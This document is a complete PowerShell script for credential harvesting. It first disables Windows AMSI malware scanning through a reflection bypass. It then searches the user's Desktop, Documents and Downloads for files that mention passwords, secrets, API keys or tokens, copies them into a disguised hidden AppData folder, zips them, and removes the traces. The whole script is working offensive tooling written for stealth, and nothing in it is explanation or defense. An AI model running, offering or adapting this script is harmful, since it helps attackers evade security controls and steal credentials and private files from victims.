# --- AMSI Bypass ---
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# --- Stealth Configuration ---
$searchPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads"
)
$sensitiveExtensions = @("*.txt", "*.csv", "*.xml", "*.config", "*.doc*", "*.xls*", "*.pdf")
$passwordKeywords = @("password", "passwd", "pwd", "secret", "api_key", "token")

# --- Hidden Output Directory (created if missing) ---
$outputDir = "$env:APPDATA\Microsoft\Hidden"
New-Item -ItemType Directory -Path $outputDir -Force -ErrorAction SilentlyContinue | Out-Null

# --- Stealth Search and Copy Function ---
$FindAndCopySensitiveFiles = {
    param($path)
    try {
        Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue -Include $sensitiveExtensions | ForEach-Object {
            $file = $_.FullName
            try {
                $content = [System.IO.File]::ReadAllText($file)
                foreach ($keyword in $passwordKeywords) {
                    if ($content -match $keyword) {
                        $dest = Join-Path -Path $outputDir -ChildPath ($file.Split('\')[-1])
                        Copy-Item -Path $file -Destination $dest -Force -ErrorAction SilentlyContinue
                        break
                    }
                }
            }
            catch {}
        }
    }
    catch {}
}

# --- Stealth Search Execution ---
foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        . $FindAndCopySensitiveFiles $path
    }
}

# --- Discreet Compression (ZIP) ---
$zipPath = "$outputDir\sensitive_$(Get-Date -Format 'yyyyMMdd').zip"
if (Test-Path "$outputDir\*") {
    Compress-Archive -Path "$outputDir\*" -DestinationPath $zipPath -Force -ErrorAction SilentlyContinue
}

# --- Cleanup (keep only the archive) ---
Get-ChildItem -Path $outputDir -Exclude "*.zip" | Remove-Item -Force -ErrorAction SilentlyContinue

# --- Stealth Exit ---
Write-Host "[*] Done." -ForegroundColor DarkGray
